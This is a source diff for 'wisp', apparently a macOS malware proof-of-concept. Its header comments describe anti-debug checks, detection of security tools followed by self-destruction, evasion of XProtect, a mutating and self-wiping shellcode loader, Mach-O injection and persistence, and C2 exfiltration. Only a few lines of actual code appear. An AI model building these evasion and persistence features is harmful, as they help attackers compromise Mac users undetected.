@@ -1,37 +1,18 @@
 /*
- * + Author: 0x00s
- * +:
- * - macOS Gatekeeper may flag it based on static heuristics, 
- * - XProtect consistently fails to detect it due to runtime mutation.
- * - Originally developed from internal research and shared publicly to demonstrate core techniques.
+ * F00's wisp - manual x86/arm64 decoder, mut8r, and Mach-O mangler
  *
- * + Execution Flow:
- *   - An anti-debug check is performed first, using simple symbol obfuscation.
- *   - Paths to Objective-See tools (e.g., LuLu) are decrypted in memory and checked for presence on the host.
- *     If detected, the binary is corrupted and self-destructs.
- *   - Then, the binary checks its initial execution location:
- *     - If running from ~/Downloads, it copies itself to /tmp and re-executes.
- *     - If all good, it proceeds with its main routine.
+ * - No unicorn, just raw decode_x86/arm64, all hand-rolled (Buggy as fuck)
+ * - Mut8r: shuffles, swaps, and mangles code, keeps it runnin'
+ * - CFG hacks: block reorder, flatten, dead/junk, reg liveness, all that
+ * - Shellcode loader: decrypts, mut8s, runs, wipes after
+ * - Mach-O: injects, trashes, persists, self-relocates if needed
+ * - Anti: sysctl, path checks, kills on debug, wipes self if poked
+ * - Crypto: ChaCha20 for rng, AES for payload, RSA for C2, zlib for squish
+ * - Vault: strings/paths all locked up, need Keys.
  *
- * + Notes:
- *   - Execution follows a simple call sequence.
- *   - OvernOut() requires a few tweaks in logic order to proceed with the dead-drop
- *     and extract the C2 address and public key for exfiltration. ;)
- *   - It's there for a reason, you’ll see it. I’m not handing out malware for free. ;)
- *   - The auth() function requires a valid key in the vault, either decrypted at runtime
- *     or embedded directly.
- *   - A correct key is essential for successful execution.
- *
- * + Misc:
- *   – Fully extensible for new techniques.
- *     This is meant to be a research sample, not a production release.
- *     For now, you can test the mutation and execution with the simple function below,
- *     run `./testme.sh` for more verbose output. 
- *
- * + Purpose:
- *   Proof-of-Concept for custom macOS malware techniques.
+ * run() kicks it off, initialize() does the setup, mutate() does the dirt
+ * try ./RunMe.sh
  */
-
 #include <wisp.h>
 
 void run() {
@@ -39,6 +20,7 @@ void run() {
 }
 
 int main(void) {
+    set_crash();
     #ifndef TEST
     initialize__strings();
     #endif
